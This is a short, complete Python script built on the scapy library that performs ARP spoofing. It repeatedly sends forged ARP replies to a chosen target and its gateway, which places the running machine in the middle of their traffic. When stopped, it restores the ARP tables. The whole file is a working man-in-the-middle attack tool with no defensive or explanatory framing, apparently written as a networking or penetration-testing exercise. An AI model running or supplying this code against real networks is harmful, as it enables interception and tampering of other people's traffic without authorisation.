#!/usr/bin/env python
import argparse
import scapy.all as scapy
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
    options = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")

    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
options = get_arguments()

try:
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Resetting ARP tables, please wait...")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
